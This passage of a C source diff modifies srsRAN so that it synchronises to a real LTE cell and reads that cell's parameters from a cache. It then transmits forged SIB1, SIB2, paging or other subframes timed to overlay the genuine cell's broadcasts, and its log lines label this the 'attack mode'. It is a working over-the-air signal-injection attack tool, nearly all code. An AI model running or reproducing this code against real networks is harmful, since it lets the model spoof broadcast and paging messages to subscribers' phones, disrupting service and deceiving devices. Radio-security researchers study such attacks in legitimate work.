+     } else if (cfr_config.cfr_enable && cfr_config.cfr_mode != SRSRAN_CFR_THR_MANUAL) {
+       cfr_config.max_papr_db += CFR_PAPR_STEP;
+       for (int i = 0; i < cell.nof_ports; i++) {
+         if (srsran_cfr_set_papr(&ifft[i].tx_cfr, cfr_config.max_papr_db) < SRSRAN_SUCCESS) {
+           ERROR("Setting the CFR");
+           goto exit;
+         }
+       }
+       if (srsran_cfr_set_papr(&ifft_mbsfn.tx_cfr, cfr_config.max_papr_db) < SRSRAN_SUCCESS) {
+         ERROR("Setting the CFR");
+         goto exit;
+       }
+       printf("CFR target PAPR set to %.3f\n", cfr_config.max_papr_db);
+     }
+   }
+ 
+   // Decrease the CFR threshold or target PAPR
+   if (cfr_thr_dec) {
+     cfr_thr_dec = false; // Reset the flag
+     if (cfr_config.cfr_enable && cfr_config.cfr_mode == SRSRAN_CFR_THR_MANUAL) {
+       if (cfr_config.manual_thr - CFR_THRES_STEP >= 0) {
+         cfr_config.manual_thr -= CFR_THRES_STEP;
+         for (int i = 0; i < cell.nof_ports; i++) {
+           if (srsran_cfr_set_threshold(&ifft[i].tx_cfr, cfr_config.manual_thr) < SRSRAN_SUCCESS) {
+             ERROR("Setting the CFR");
+             goto exit;
+           }
+         }
+         if (srsran_cfr_set_threshold(&ifft_mbsfn.tx_cfr, cfr_config.manual_thr) < SRSRAN_SUCCESS) {
+           ERROR("Setting the CFR");
+           goto exit;
+         }
+         printf("CFR Thres. set to %.3f\n", cfr_config.manual_thr);
+       }
+     } else if (cfr_config.cfr_enable && cfr_config.cfr_mode != SRSRAN_CFR_THR_MANUAL) {
+       if (cfr_config.max_papr_db - CFR_PAPR_STEP >= 0) {
+         cfr_config.max_papr_db -= CFR_PAPR_STEP;
+         for (int i = 0; i < cell.nof_ports; i++) {
+           if (srsran_cfr_set_papr(&ifft[i].tx_cfr, cfr_config.max_papr_db) < SRSRAN_SUCCESS) {
+             ERROR("Setting the CFR");
+             goto exit;
+           }
+         }
+         if (srsran_cfr_set_papr(&ifft_mbsfn.tx_cfr, cfr_config.max_papr_db) < SRSRAN_SUCCESS) {
+           ERROR("Setting the CFR");
+           goto exit;
+         }
+         printf("CFR target PAPR set to %.3f\n", cfr_config.max_papr_db);
+       }
+     }
+   }
+ 
+   srsran_dci_dl_fprint(stdout, &dci_dl, cell.nof_prb);
+   printf("\nCFR controls:\n");
+   printf("    Param   | INC | DEC |\n");
+   printf("------------+-----+-----+\n");
+   printf(" Thres/PAPR |  %c  |  %c  |\n", CFR_THRES_UP_KEY, CFR_THRES_DN_KEY);
+   printf("\n");
+   if (transmission_mode != SRSRAN_TM1) {
+     printf("\nTransmission mode key table:\n");
+     printf("   Mode   |   1TB   | 2TB |\n");
+     printf("----------+---------+-----+\n");
+     printf("Diversity |    x    |     |\n");
+     printf("      CDD |         |  z  |\n");
+     printf("Multiplex | q,w,e,r | a,s |\n");
+     printf("\n");
+     printf("Type new MCS index (0-28) or cfr/mode key and press Enter: ");
+   } else {
+     printf("Type new MCS index (0-28) or cfr key and press Enter: ");
+   }
+   fflush(stdout);
+   ret = SRSRAN_SUCCESS;
+ 
+ exit:
+   return ret;
+ }
+ 
+ /* Read new MCS from stdin */
+ static int update_control()
+ {
+   char input[128];
+ 
+   fd_set set;
+   FD_ZERO(&set);
+   FD_SET(0, &set);
+ 
+   struct timeval to;
+   to.tv_sec  = 0;
+   to.tv_usec = 0;
+ 
+   int n = select(1, &set, NULL, NULL, &to);
+   if (n == 1) {
+     // stdin ready
+     if (fgets(input, sizeof(input), stdin)) {
+       if (input[0] == 27) {
+         switch (input[2]) {
+           case RIGHT_KEY:
+             if (prbset_orig + prbset_num < (int)ceilf((float)cell.nof_prb / srsran_ra_type0_P(cell.nof_prb)))
+               prbset_orig++;
+             break;
+           case LEFT_KEY:
+             if (prbset_orig > 0)
+               prbset_orig--;
+             break;
+           case UP_KEY:
+             if (prbset_num < (int)ceilf((float)cell.nof_prb / srsran_ra_type0_P(cell.nof_prb)))
+               prbset_num++;
+             break;
+           case DOWN_KEY:
+             last_prbset_num = prbset_num;
+             if (prbset_num > 0)
+               prbset_num--;
+             break;
+ #ifndef DISABLE_RF
+           case PAGE_UP:
+             if (!output_file_name) {
+               rf_gain++;
+               srsran_rf_set_tx_gain(&radio, rf_gain);
+               //printf("test yg 1025 line 868 Set TX gain: %.1f dB\n", srsran_rf_get_tx_gain(&radio));
+             }
+             break;
+           case PAGE_DOWN:
+             if (!output_file_name) {
+               rf_gain--;
+               srsran_rf_set_tx_gain(&radio, rf_gain);
+               //printf("test yg 1025 line 875 Set TX gain: %.1f dB\n", srsran_rf_get_tx_gain(&radio));
+             }
+             break;
+ #endif
+         }
+       } else {
+         switch (input[0]) {
+           case 'q':
+             transmission_mode    = SRSRAN_TM4;
+             multiplex_pmi        = 0;
+             multiplex_nof_layers = 1;
+             break;
+           case 'w':
+             transmission_mode    = SRSRAN_TM4;
+             multiplex_pmi        = 1;
+             multiplex_nof_layers = 1;
+             break;
+           case 'e':
+             transmission_mode    = SRSRAN_TM4;
+             multiplex_pmi        = 2;
+             multiplex_nof_layers = 1;
+             break;
+           case 'r':
+             transmission_mode    = SRSRAN_TM4;
+             multiplex_pmi        = 3;
+             multiplex_nof_layers = 1;
+             break;
+           case 'a':
+             transmission_mode    = SRSRAN_TM4;
+             multiplex_pmi        = 0;
+             multiplex_nof_layers = 2;
+             break;
+           case 's':
+             transmission_mode    = SRSRAN_TM4;
+             multiplex_pmi        = 1;
+             multiplex_nof_layers = 2;
+             break;
+           case 'z':
+             transmission_mode = SRSRAN_TM3;
+             break;
+           case 'x':
+             transmission_mode = SRSRAN_TM2;
+             break;
+           case CFR_THRES_UP_KEY:
+             cfr_thr_inc = true;
+             break;
+           case CFR_THRES_DN_KEY:
+             cfr_thr_dec = true;
+             break;
+           default:
+             last_mcs_idx = mcs_idx;
+             mcs_idx      = strtol(input, NULL, 10);
+         }
+       }
+       bzero(input, sizeof(input));
+       if (update_radl()) {
+         printf("Trying with last known MCS index\n");
+         mcs_idx    = last_mcs_idx;
+         prbset_num = last_prbset_num;
+         return update_radl();
+       }
+     }
+     return 0;
+   } else if (n < 0) {
+     // error
+     perror("select");
+     return SRSRAN_ERROR;
+   } else {
+     return SRSRAN_SUCCESS;
+   }
+ }
+ 
+ /** Function run in a separate thread to receive UDP data */
+ static void* net_thread_fnc(void* arg)
+ {
+   int n;
+   int rpm = 0, wpm = 0;
+ 
+   do {
+     n = srsran_netsource_read(&net_source, &data2[rpm], DATA_BUFF_SZ - rpm);
+     if (n > 0) {
+       // TODO: I assume that both transport blocks have same size in case of 2 tb are active
+ 
+       int nbytes = 1 + (((mbsfn_area_id > -1) ? (pmch_cfg.pdsch_cfg.grant.tb[0].tbs)
+                                               : (pdsch_cfg.grant.tb[0].tbs + pdsch_cfg.grant.tb[1].tbs)) -
+                         1) /
+                            8;
+       rpm += n;
+       INFO("received %d bytes. rpm=%d/%d", n, rpm, nbytes);
+       wpm = 0;
+       while (rpm >= nbytes) {
+         // wait for packet to be transmitted
+         sem_wait(&net_sem);
+         if (mbsfn_area_id > -1) {
+           memcpy(data_mbms, &data2[wpm], nbytes);
+         } else {
+           memcpy(data[0], &data2[wpm], nbytes / (size_t)2);
+           memcpy(data[1], &data2[wpm], nbytes / (size_t)2);
+         }
+         INFO("Sent %d/%d bytes ready", nbytes, rpm);
+         rpm -= nbytes;
+         wpm += nbytes;
+         net_packet_ready = true;
+       }
+       if (wpm > 0) {
+         INFO("%d bytes left in buffer for next packet", rpm);
+         memcpy(data2, &data2[wpm], rpm * sizeof(uint8_t));
+       }
+     } else if (n == 0) {
+       rpm = 0;
+     } else {
+       ERROR("Error receiving from network");
+       exit(-1);
+     }
+   } while (true);
+ }
+ 
+ static void read_file(cf_t *buff, char *file_name){
+   char file_path[256];
+   snprintf(file_path, sizeof(file_path), "%s/%s", cell_dir, file_name);
+   FILE *fp = NULL;
+   int cnt = 0;
+   int i = 0;
+   int total = 0;
+   if (!buff) {
+     printf("buff null\n");
+   }
+   fp = fopen(file_path, "rb");
+   if (!fp) {
+     perror("fopen");
+     exit(-1);
+   }
+ 
+   while(!feof(fp)) {
+     cnt = fread(buff+i, sizeof(cf_t), 1, fp);
+     total += cnt;
+     i++;
+   }
+   printf("File length:%d\n", total);
+   fclose(fp);
+ }
+ 
+ #ifndef DISABLE_RF
+ int srsran_rf_recv_wrapper(void* h, cf_t* data_[SRSRAN_MAX_PORTS], uint32_t nsamples, srsran_timestamp_t* t) {
+   DEBUG(" ----  Receive %d samples  ----", nsamples);
+   void* ptr[SRSRAN_MAX_PORTS];
+   for (int i = 0; i < SRSRAN_MAX_PORTS; i++) {
+     ptr[i] = data_[i];
+   }
+ 
+   return srsran_rf_recv_with_time_multi(h, ptr, nsamples, true, &(t->full_secs), &(t->frac_secs));
+ }
+ # endif
+ 
+ // timed transmission
+ static void* tx_thread_func() {
+   unsigned long mask = 8; // processor 4   // 1 2 4 8 (1,2,3,4)
+   if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
+     perror("pthread_setaffinity_np");
+   }
+   srsran_timestamp_t future_time;
+   bool start_of_burst = true;
+   bool end_of_burst = true;
+   bool first = true;
+   float time_offset;
+   time_offset = 0.014 - 0.0001;
+ 
+   int cur_sf_idx;
+   int cur_sfn;
+   int target_sfn;
+   int next_sfn = -1;
+   int cur_rx_ret;
+   srsran_timestamp_t cur_time;
+   float estimated_cfo, estimated_sfo;
+   bool fisrt_over = true;
+   while (!go_exit) {
+     pthread_mutex_lock(&mutex);
+     while (updated == false) {
+       pthread_cond_wait(&cond, &mutex);
+     }
+     updated = false;
+     cur_sf_idx = sf_idx;
+     cur_sfn = sfn;
+     cur_rx_ret = rx_ret;
+     //printf("ret:%d sfn:%d sf_idx:%d\n", rx_ret, sfn, sf_idx);
+     memcpy(&cur_time, &last_stamp, sizeof(srsran_timestamp_t));
+     pthread_mutex_unlock(&mutex);
+     if (fisrt_over && cur_sfn >= 0) {
+      target_sfn = cur_sfn;
+      fisrt_over = false;
+     }
+     if (cur_sfn < target_sfn) {
+      continue;     
+     } else if (cur_sfn > target_sfn) {
+      target_sfn = cur_sfn;
+     }
+
+     if (cur_rx_ret != 0) {
+       ERROR("[Tx] rx_ret: %d\n",cur_rx_ret);
+     }
+     if (cur_rx_ret == 0 && cur_sfn >= 0 && first == true) {
+       estimated_cfo = srsran_ue_sync_get_cfo(&ue_sync);
+       estimated_sfo = srsran_ue_sync_get_sfo(&ue_sync);
+       first = false;
+       printf("Frequency offset estimated..........CFO: %f SFO: %f\n", estimated_cfo, estimated_sfo);
+       continue;
+     }
+     if (cur_rx_ret == 0 && cur_sfn >= 0) {
+       next_sfn = (cur_sfn + 1) % 1024; 
+       int ret = -1;
+       if (sib1_msg && paging_msg) {
+        if (next_sfn % sib1_period == 0 || true) {
+          target_tti = 5;
+          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+          printf("%s [Subframe 5] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+          ret = srsran_rf_send_timed_multi(&radio, (void**) sib1_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+          if (ret != sf_n_samples) {
+            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+            exit(-1);
+          }
+
+          target_tti = 9;
+          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+          printf("%s [Subframe 9] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+          ret = srsran_rf_send_timed_multi(&radio, (void**) paging_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+          if (ret != sf_n_samples) {
+            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+            exit(-1);
+          }
+          target_sfn = (target_sfn + 1) % 1024;
+        }
+       } else if (sib2_msg && paging_msg) {
+        if (next_sfn % sib2_period == 0) {
+          target_tti = 1;
+          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+          printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+          ret = srsran_rf_send_timed_multi(&radio, (void**) sib2_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+          if (ret != sf_n_samples) {
+            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+            exit(-1);
+          }
+        }
+          target_tti = 9;
+          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+          printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+          ret = srsran_rf_send_timed_multi(&radio, (void**) paging_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+          if (ret != sf_n_samples) {
+            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+            exit(-1);
+          }
+          target_sfn = (target_sfn + 1) % 1024;
+          printf("\n");
+    
+      } else if(paging_msg) {
+        target_tti = 9;
+        memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+        time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+        srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+        printf("%s [Subframe 9] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+        ret = srsran_rf_send_timed_multi(&radio, (void**) paging_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+        if (ret != sf_n_samples) {
+          printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+          exit(-1);
+        }
+        target_sfn = (target_sfn + 1) % 1024;
+      } else if(ext_msg) {
+        memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+        time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+        srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+        printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+        ret = srsran_rf_send_timed_multi(&radio, (void**) ext_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+        if (ret != sf_n_samples) {
+          printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+          exit(-1);
+        }
+        target_sfn = (target_sfn + 1) % 1024;
+      }
+      first = false;
+     }
+   }
+ 
+   return NULL;
+ }
+ 
+ static void* rx_thread_func() {
+   unsigned long mask = 4; // processor 3, 1 2 4 8 (1,2,3,4)
+   if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
+     perror("pthread_setaffinity_np");
+   }
+ 
+   int ret;
+   int n;
+   bool acks[SRSRAN_MAX_CODEWORDS] = {false};
+   srsran_cell_t cell;
+   uint8_t bch_payload[SRSRAN_BCH_PAYLOAD_LEN];
+   int     sfn_offset;
+         
+   while (!go_exit) {
+     pthread_mutex_lock(&mutex);
+ 
+     cf_t* buffers[SRSRAN_MAX_CHANNELS] = {};
+     for (int p = 0; p < SRSRAN_MAX_PORTS; p++) {
+       buffers[p] = sf_buffer_sync[p];
+     }
+     ret = srsran_ue_sync_zerocopy(&ue_sync, buffers, max_num_samples);
+     //printf("test yg ret:%d, sfn:%d, sf_idx:%d\n", ret, &ue_sync.sf_idx);
+     if (ret != 1) {
+       rx_ret = -1;
+       sfn = -100;
+       printf("srsran_ue_sync_zerocopy failed\n");
+       updated = true;
+       pthread_cond_signal(&cond);
+       pthread_mutex_unlock(&mutex);
+     }
+     if (ret == 1) {
+       rx_ret = 0;
+       srsran_ue_sync_get_last_timestamp(&ue_sync, &last_stamp);
+ 
+       sf_idx = srsran_ue_sync_get_sfidx(&ue_sync);
+       if (sf_idx == 0) {
+        //printf("test yg before decode sfn:%d\n", sfn);
+         n = srsran_ue_mib_decode(&ue_mib, bch_payload, NULL, &sfn_offset);
+         if (n < 0) {
+           ERROR("Error decoding UE MIB");
+           exit(-1);
+         } else if (n == 0) {
+           sfn = -100;
+           ERROR("MIB Decoding failed");
+         } else if (n == SRSRAN_UE_MIB_FOUND) {
+           srsran_pbch_mib_unpack(bch_payload, &cell, &sfn);
+           sfn = (sfn + sfn_offset) % 1024;
+           //printf("test yg after decode sfn:%d\n\n", sfn);
+
+         }
+
+       }
+       updated = true;
+       pthread_cond_signal(&cond);
+ 
+       if (sf_idx == 5 && (sfn % 2) == 0) {
+         ue_dl_cfg.chest_cfg = chest_pdsch_cfg;
+         dl_sf.tti = sfn * 10 + sf_idx;
+         dl_sf.sf_type = SRSRAN_SF_NORM;
+         ue_dl_cfg.cfg.tm = SRSRAN_TM1;
+         ue_dl_cfg.cfg.pdsch.use_tbs_index_alt = false;
+         n = srsran_ue_dl_find_and_decode(&ue_dl, &dl_sf, &ue_dl_cfg, &pdsch_cfg, data, acks);
+       }
+       pthread_mutex_unlock(&mutex);
+       usleep(1);
+     }
+   }
+ 
+   return NULL;
+ }
+
+
+int is_directory(const char *path) {
+    struct stat st;
+    if (stat(path, &st) != 0) return 0;
+    return S_ISDIR(st.st_mode);
+}
+
+int file_exists(const char *path) {
+    struct stat st;
+    return (stat(path, &st) == 0);
+}
+
+char* path_join(const char* a, const char* b) {
+    size_t len = strlen(a) + strlen(b) + 2;  // '/' + null
+    char* result = malloc(len);
+    if (!result) return NULL;
+    snprintf(result, len, "%s/%s", a, b);
+    return result;
+}
+
+
+void search_recursive(const char* root, const char* target_name, uint32_t pci, char** found_path) {
+  DIR* dir = opendir(root);
+  if (!dir) {
+      fprintf(stderr, "[ERROR] Cannot open directory: %s (errno=%d)\n", root, errno);
+      return;
+  }
+
+  struct dirent* entry;
+  while ((entry = readdir(dir)) != NULL) {
+      if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+          continue;
+
+      char* subpath = path_join(root, entry->d_name);
+      if (!subpath) continue;
+
+      if (is_directory(subpath)) {
+        if (strcmp(entry->d_name, target_name) == 0) {
+            char* mib_path = path_join(subpath, "mib.json");
+            if (mib_path) {
+                if (file_exists(mib_path)) {
+                    if (*found_path == NULL) {
+                        *found_path = strdup(subpath);
+                    } else {
+                        fprintf(stderr, "[WARNING] Multiple cell directories found for PCI=%u:\n", pci);
+                        fprintf(stderr, "   %s\n", *found_path);
+                        fprintf(stderr, "   %s\n", subpath);
+                        fprintf(stderr, "   Using first one.\n");
+                    }
+                } else {
+                    fprintf(stderr, "[DEBUG] Missing mib.json in: %s\n", subpath);
+                }
+                free(mib_path);
+            }
+        }
+    
+        search_recursive(subpath, target_name, pci, found_path);
+    }
+
+      free(subpath);
+  }
+
+  closedir(dir);
+}
+
+char* find_cell_dir(const char* cache_root, uint32_t pci) {
+  char target_name[64];
+  snprintf(target_name, sizeof(target_name), "cell_%u", pci);
+
+  char* found_path = NULL;
+
+  search_recursive(cache_root, target_name, pci, &found_path);
+
+  return found_path;
+}
+
+/**
+ * @brief 从 ../output/cell.json 读取小区配置并填充 cell 结构
+ * @return 0 成功，-1 失败
+ */
+int read_cell_config_from_json() {
+    FILE* file = fopen(cell_config_path, "r");
+    if (!file) {
+        fprintf(stderr, "[ERROR] Cannot open file '%s'\n", cell_config_path);
+        return -1;
+    }
+    fseek(file, 0, SEEK_END);
+    long file_length = ftell(file);
+    fseek(file, 0, SEEK_SET);
+
+    if (file_length <= 0) {
+        fprintf(stderr, "[ERROR] Empty or invalid file: %s\n", cell_config_path);
+        fclose(file);
+        return -1;
+    }
+
+    char* buffer = (char*)malloc(file_length + 1);
+    if (!buffer) {
+        fprintf(stderr, "[ERROR] Out of memory\n");
+        fclose(file);
+        return -1;
+    }
+
+    size_t read_size = fread(buffer, 1, file_length, file);
+    fclose(file);
+    buffer[read_size] = '\0'; 
+
+    cJSON* json = cJSON_Parse(buffer);
+    free(buffer); 
+
+    if (!json) {
+        fprintf(stderr, "[ERROR] Failed to parse JSON: %s\n", cJSON_GetErrorPtr());
+        return -1;
+    }
+
+    int ret = -1;
+    cJSON *item;
+
+    do {
+        item = cJSON_GetObjectItem(json, "Type");
+        if (!item || !cJSON_IsString(item)) {
+            fprintf(stderr, "[ERROR] Missing or invalid 'Type' field\n");
+            break;
+        }
+        const char* type = item->valuestring;
+        cell.frame_type = (strcmp(type, "FDD") == 0) ? SRSRAN_FDD : 
+                         (strcmp(type, "TDD") == 0) ? SRSRAN_TDD : -1;
+        if (cell.frame_type == -1) {
+            fprintf(stderr, "[ERROR] Invalid Type value: %s\n", type);
+            break;
+        }
+
+        item = cJSON_GetObjectItem(json, "PCI");
+        if (!item || !cJSON_IsNumber(item)) {
+            fprintf(stderr, "[ERROR] Missing or invalid 'PCI' field\n");
+            break;
+        }
+        cell.id = (uint32_t)item->valuedouble;
+
+        item = cJSON_GetObjectItem(json, "Nof Ports");
+        if (!item || !cJSON_IsNumber(item)) {
+            fprintf(stderr, "[ERROR] Missing or invalid 'Nof Ports' field\n");
+            break;
+        }
+        cell.nof_ports = (uint32_t)item->valuedouble;
+
+        item = cJSON_GetObjectItem(json, "DL Freq");
+        if (!item || !cJSON_IsNumber(item)) {
+            fprintf(stderr, "[ERROR] Missing or invalid 'DL Freq' field\n");
+            break;
+        }
+        rf_freq = (uint32_t)item->valuedouble;       
+
+        item = cJSON_GetObjectItem(json, "CP");
+        if (!item || !cJSON_IsString(item)) {
+            fprintf(stderr, "[ERROR] Missing or invalid 'CP' field\n");
+            break;
+        }
+        const char* cp = item->valuestring;
+        cell.cp = (strstr(cp, "Normal") != NULL) ? SRSRAN_CP_NORM : SRSRAN_CP_EXT;
+
+        item = cJSON_GetObjectItem(json, "PRB");
+        if (!item || !cJSON_IsNumber(item)) {
+            fprintf(stderr, "[ERROR] Missing or invalid 'PRB' field\n");
+            break;
+        }
+        cell.nof_prb = (uint32_t)item->valuedouble;
+
+        item = cJSON_GetObjectItem(json, "PHICH Length");
+        if (!item || !cJSON_IsString(item)) {
+            fprintf(stderr, "[ERROR] Missing or invalid 'PHICH Length' field\n");
+            break;
+        }
+        const char* phich_length = item->valuestring;
+        cell.phich_length = (strcmp(phich_length, "normal") == 0) ? SRSRAN_PHICH_NORM : 
+                           (strcmp(phich_length, "extended") == 0) ? SRSRAN_PHICH_EXT : -1;
+        if (cell.phich_length == -1) {
+            fprintf(stderr, "[ERROR] Invalid PHICH Length: %s\n", phich_length);
+            break;
+        }
+
+        item = cJSON_GetObjectItem(json, "PHICH Resources");
+        if (!item || !cJSON_IsNumber(item)) {
+            fprintf(stderr, "[ERROR] Missing or invalid 'PHICH Resources' field\n");
+            break;
+        }
+        int phich_resources = (int)item->valuedouble;
+        switch (phich_resources) {
+            case 1:  cell.phich_resources = SRSRAN_PHICH_R_1_6;  break;
+            case 2:  cell.phich_resources = SRSRAN_PHICH_R_1_2; break;
+            case 4:  cell.phich_resources = SRSRAN_PHICH_R_1;   break;
+            case 8:  cell.phich_resources = SRSRAN_PHICH_R_2;   break;
+            default:
+                fprintf(stderr, "[ERROR] Invalid PHICH Resources value: %d\n", phich_resources);
+                break;
+        }
+
+        ret = 0;
+
+    } while (0); 
+    if (ret == 0) {
+        printf("[OK] Successfully loaded cell config:\n");
+        printf("   Type: %s\n", cell.frame_type == SRSRAN_FDD ? "FDD" : "TDD");
+        printf("   PCI: %u\n", cell.id);
+        printf("   PRB: %u\n", cell.nof_prb);
+        printf("   Ports: %u\n", cell.nof_ports);
+        printf("   CP: %s\n", cell.cp == SRSRAN_CP_NORM ? "Normal" : "Extended");
+        printf("   PHICH Length: %s\n", cell.phich_length == SRSRAN_PHICH_NORM ? "normal" : "extended");
+        printf("   PHICH Resources: %d\n", cell.phich_resources);
+    }
+
+    cJSON_Delete(json);
+    return ret;
+}
+
+int main(int argc, char** argv)
+ {
+   int                   nf = 0, N_id_2 = 0;
+   cf_t                  pss_signal[SRSRAN_PSS_LEN];
+   float                 sss_signal0[SRSRAN_SSS_LEN]; 
+   float                 sss_signal5[SRSRAN_SSS_LEN]; 
+   uint8_t               bch_payload[SRSRAN_BCH_PAYLOAD_LEN];
+   int                   i;
+   cf_t*                 sf_symbols[SRSRAN_MAX_PORTS];
+   srsran_dci_msg_t      dci_msg;
+   srsran_dci_location_t locations[SRSRAN_NOF_SF_X_FRAME][30];
+   uint32_t              sfn;
+   srsran_refsignal_t    csr_refs;
+   srsran_refsignal_t    mbsfn_refs;
+   float search_cell_cfo = 0;
+   int decimate = 1;
+ 
+   srsran_use_standard_symbol_size(true);
+   srsran_debug_handle_crash(argc, argv);
+ 
+ #ifdef DISABLE_RF
+   if (argc < 3) {
+     usage(argv[0]);
+     exit(-1);
+   }
+ #endif
+ 
+  parse_args(argc, argv);
+  cell_dir = find_cell_dir(cache_root, cell.id);
+  if (cell_dir == NULL || strlen(cell_dir) == 0) {
+      fprintf(stderr, "[ERROR] Cell not found for PCI=%u\n", cell.id);
+      if (cell_dir) free(cell_dir); 
+      return -1;
+  }
+
+  snprintf(cell_config_path, sizeof(cell_config_path), "%s/cell.json", cell_dir);
+  read_cell_config_from_json();
+   if (parse_cfr_args() < SRSRAN_SUCCESS) {
+     ERROR("Error parsing CFR args");
+     exit(-1);
+   }
+   uint8_t mch_table[10];
+   bzero(&mch_table[0], sizeof(uint8_t) * 10);
+   if (mbsfn_area_id > -1) {
+     generate_mcch_table(mch_table, mbsfn_sf_mask);
+   }
+   N_id_2       = cell.id % 3;
+   sf_n_re      = SRSRAN_SF_LEN_RE(cell.nof_prb, cell.cp);
+   sf_n_samples = 1.2 * 2 * SRSRAN_SLOT_LEN(srsran_symbol_sz(cell.nof_prb));
+   else_sf_n_samples = 18432;
+   cell.phich_length    = SRSRAN_PHICH_NORM;
+   cell.phich_resources = SRSRAN_PHICH_R_1;
+   sfn                  = 0;
+   prbset_num      = (int)ceilf((float)cell.nof_prb / srsran_ra_type0_P(cell.nof_prb));
+   last_prbset_num = prbset_num;
+   base_init();
+   /* Generate PSS/SSS signals */
+   srsran_pss_generate(pss_signal, N_id_2);
+   srsran_sss_generate(sss_signal0, sss_signal5, cell.id);
+ 
+   /* Generate reference signals */
+   if (srsran_refsignal_cs_init(&csr_refs, cell.nof_prb)) {
+     ERROR("Error initializing equalizer");
+     exit(-1);
+   }
+   if (mbsfn_area_id > -1) {
+     if (srsran_refsignal_mbsfn_init(&mbsfn_refs, cell.nof_prb)) {
+       ERROR("Error initializing equalizer");
+       exit(-1);
+     }
+     if (srsran_refsignal_mbsfn_set_cell(&mbsfn_refs, cell, mbsfn_area_id)) {
+       ERROR("Error initializing MBSFNR signal");
+       exit(-1);
+     }
+   }
+ 
+   if (srsran_refsignal_cs_set_cell(&csr_refs, cell)) {
+     ERROR("Error setting cell");
+     exit(-1);
+   }
+ 
+   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
+     sf_symbols[i] = sf_buffer[i % cell.nof_ports];
+   }
+ 
+ #ifndef DISABLE_RF
+ 
+   sigset_t sigset;
+   sigemptyset(&sigset);
+   sigaddset(&sigset, SIGINT);
+   sigprocmask(SIG_UNBLOCK, &sigset, NULL);
+   signal(SIGINT, sig_int_handler);
+ 
+   if (!output_file_name) {
+     int srate = srsran_sampling_freq_hz(cell.nof_prb);
+     printf("srate:%d\n", srate);
+     printf("nof_prb:%d\n", cell.nof_prb);
+     if (srate != -1) {
+ 
+       printf("Setting sampling rate %.2f MHz\n", (float)srate / 1000000);
+       float srate_rf = srsran_rf_set_tx_srate(&radio, (double)srate);
+       if (srate_rf != srate) {
+         ERROR("Could not set sampling rate");
+         exit(-1);
+       }
+     } else {
+       ERROR("Invalid number of PRB %d", cell.nof_prb);
+       exit(-1);
+     }
+     srsran_rf_set_tx_gain_ch(&radio, 0, rf_gain);
+     srsran_rf_set_tx_gain_ch(&radio, 1, rf_gain);
+     printf("Get TX gain: %.1f dB\n", srsran_rf_get_tx_gain(&radio));
+     printf("Set TX freq: %.2f MHz\n", srsran_rf_set_tx_freq(&radio, cell.nof_ports, rf_freq) / 1000000);
+     printf("Set RX freq: %.2f MHz\n", srsran_rf_set_rx_freq(&radio, cell.nof_ports, rf_freq) / 1000000);
+     srsran_rf_set_rx_gain(&radio, 40);
+     printf("Get RX gain: %.1f dB\n", srsran_rf_get_rx_gain(&radio));
+     
+     uint32_t ntrial = 0;
+     int ret = 0;
+     do {
+       ret = rf_search_and_decode_mib(&radio, transmission_mode+1, &cell_detect_config, -1, &cell, &search_cell_cfo);
+       if (ret < 0) {
+         ERROR("Error searching for cell");
+         exit(-1);
+       } else if (ret == 0 && !go_exit) {
